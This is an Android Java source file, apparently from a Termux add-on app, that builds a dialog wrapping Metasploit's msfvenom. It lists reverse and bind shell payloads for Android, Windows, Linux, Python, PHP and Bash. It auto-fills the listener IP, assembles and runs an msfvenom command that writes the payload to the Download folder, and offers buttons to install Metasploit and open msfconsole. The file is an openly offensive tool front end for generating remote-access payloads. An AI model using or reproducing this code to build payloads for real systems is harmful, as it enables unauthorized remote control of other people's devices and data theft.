package com.termux.menu.ui.dialog;

import android.app.Dialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import com.termux.menu.termux.TermuxCommandHelper;

import java.net.Inet4Address;
import java.net.NetworkInterface;
import java.util.Enumeration;

/**
 * Metasploit msfvenom 图形化参数表单 — 对齐 ZeroTermux-main MetasploitDialog。
 */
public class MetasploitDialog extends Dialog {

    // Platform → format mapping
    private static final String[][] PLATFORMS = {
        {"Android", "android/meterpreter/reverse_tcp", "raw"},
        {"Windows", "windows/meterpreter/reverse_tcp", "exe"},
        {"Linux", "linux/x86/meterpreter/reverse_tcp", "elf"},
        {"Python", "python/meterpreter/reverse_tcp", "py"},
        {"PHP", "php/meterpreter_reverse_tcp", "php"},
        {"Bash", "cmd/unix/reverse_bash", "sh"},
    };

    private Context mContext;
    private TermuxCommandHelper mCmdHelper;

    private EditText mLhostEdit;
    private EditText mLportEdit;
    private EditText mFilenameEdit;
    private Spinner mPlatformSpinner;
    private Spinner mPayloadSpinner;
    private Spinner mCallbackSpinner;
    private Spinner mStagerSpinner;

    public MetasploitDialog(Context context) {
        super(context);
        mContext = context;
        mCmdHelper = TermuxCommandHelper.getInstance(context);
        init();
    }

    private void init() {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setCancelable(true);

        ScrollView scroll = new ScrollView(mContext);
        LinearLayout root = new LinearLayout(mContext);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF161823);
        root.setPadding(dp(20), dp(16), dp(20), dp(16));

        TextView title = new TextView(mContext);
        title.setText("Metasploit msfvenom");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(18);
        title.setPadding(0, 0, 0, dp(12));
        root.addView(title);

        // Platform
        root.addView(label("平台类型:"));
        mPlatformSpinner = spinner(new String[]{"Android", "Windows", "Linux", "Python", "PHP", "Bash"});
        root.addView(mPlatformSpinner);

        // LHOST
        root.addView(label("LHOST (监听IP):"));
        mLhostEdit = editText(detectLocalIP());
        root.addView(mLhostEdit);

        // LPORT
        root.addView(label("LPORT (监听端口):"));
        mLportEdit = editText("4444");
        root.addView(mLportEdit);

        // Filename
        root.addView(label("输出文件名:"));
        mFilenameEdit = editText("payload");
        root.addView(mFilenameEdit);

        // Advanced options
        root.addView(label("高级选项:"));
        LinearLayout advRow = new LinearLayout(mContext);
        advRow.setOrientation(LinearLayout.HORIZONTAL);

        mPayloadSpinner = spinner(new String[]{"Meterpreter", "Shell"});
        mCallbackSpinner = spinner(new String[]{"Reverse", "Bind"});
        mStagerSpinner = spinner(new String[]{"Staged", "Stageless"});

        advRow.addView(mPayloadSpinner);
        advRow.addView(mCallbackSpinner);
        advRow.addView(mStagerSpinner);
        root.addView(advRow);

        // Buttons
        LinearLayout btnRow = new LinearLayout(mContext);
        btnRow.setPadding(0, dp(16), 0, 0);

        Button genBtn = btn("生成Payload", 0xFF4CAF50);
        genBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { generate(); }
        });
        btnRow.addView(genBtn);

        Button consoleBtn = btn("MSF控制台", 0xFF2196F3);
        consoleBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                mCmdHelper.sendCommandToTerminal("nethunter -r msfconsole");
                Toast.makeText(mContext, "已启动MSF控制台", Toast.LENGTH_SHORT).show();
                dismiss();
            }
        });
        btnRow.addView(consoleBtn);

        Button installBtn = btn("安装MSF", 0xFFFF9800);
        installBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                mCmdHelper.sendCommandToTerminal(
                    "nethunter -r 'apt update && apt install metasploit-framework -y'");
                Toast.makeText(mContext, "正在安装Metasploit...", Toast.LENGTH_SHORT).show();
                dismiss();
            }
        });
        btnRow.addView(installBtn);

        root.addView(btnRow);
        scroll.addView(root);
        setContentView(scroll);

        Window w = getWindow();
        if (w != null) {
            w.setGravity(Gravity.BOTTOM);
            w.setLayout(ViewGroup.LayoutParams.MATCH_PARENT,
                (int)(mContext.getResources().getDisplayMetrics().heightPixels * 0.8));
            w.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                w.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
            else w.setType(WindowManager.LayoutParams.TYPE_PHONE);
        }
    }

    private void generate() {
        int plat = mPlatformSpinner.getSelectedItemPosition();
        String payload = PLATFORMS[plat][1];
        String format = PLATFORMS[plat][2];

        // Meterpreter or Shell
        if (mPayloadSpinner.getSelectedItemPosition() == 1)
            payload = payload.replace("meterpreter", "shell");

        // Bind or Reverse
        if (mCallbackSpinner.getSelectedItemPosition() == 1)
            payload = payload.replace("reverse", "bind");

        // Stageless
        if (mStagerSpinner.getSelectedItemPosition() == 1)
            payload = payload.replace("reverse_tcp", "reverse_tcp_nodns");

        String lhost = mLhostEdit.getText().toString().trim();
        String lport = mLportEdit.getText().toString().trim();
        String fname = mFilenameEdit.getText().toString().trim();
        if (fname.isEmpty()) fname = "payload";

        String cmd = "nethunter -r 'msfvenom -p " + payload
            + " LHOST=" + lhost + " LPORT=" + lport
            + " -f " + format + " -o /sdcard/Download/" + fname + "." + format + "'";

        mCmdHelper.sendCommandToTerminal(cmd);
        Toast.makeText(mContext, "Payload生成中: /sdcard/Download/" + fname + "." + format,
            Toast.LENGTH_LONG).show();
        dismiss();
    }

    private String detectLocalIP() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces();
                 en.hasMoreElements();) {
                NetworkInterface ni = en.nextElement();
                for (Enumeration<java.net.InetAddress> ea = ni.getInetAddresses();
                     ea.hasMoreElements();) {
                    java.net.InetAddress addr = ea.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address)
                        return addr.getHostAddress();
                }
            }
        } catch (Exception ignored) {}
        return "192.168.1.100";
    }

    private TextView label(String t) {
        TextView tv = new TextView(mContext);
        tv.setText(t); tv.setTextColor(0xFFBBBBBB); tv.setTextSize(13);
        tv.setPadding(0, dp(10), 0, dp(4)); return tv;
    }
    private EditText editText(String def) {
        EditText et = new EditText(mContext);
        et.setText(def); et.setTextColor(0xFFFFFFFF); et.setHintTextColor(0xFF888888);
        et.setBackgroundColor(0x22FFFFFF); et.setPadding(dp(12),dp(8),dp(12),dp(8));
        et.setSingleLine(true); et.setTextSize(14); return et;
    }
    private Spinner spinner(String[] items) {
        Spinner s = new Spinner(mContext);
        ArrayAdapter<String> a = new ArrayAdapter<>(mContext, android.R.layout.simple_spinner_item, items);
        a.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        s.setAdapter(a); return s;
    }
    private Button btn(String text, int color) {
        Button b = new Button(mContext); b.setText(text); b.setTextColor(0xFFFFFFFF);
        b.setBackgroundColor(color);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0,
            ViewGroup.LayoutParams.WRAP_CONTENT, 1);
        p.rightMargin = dp(6); b.setLayoutParams(p); return b;
    }
    private int dp(int v) {
        return (int)(v * mContext.getResources().getDisplayMetrics().density + 0.5f);
    }
}
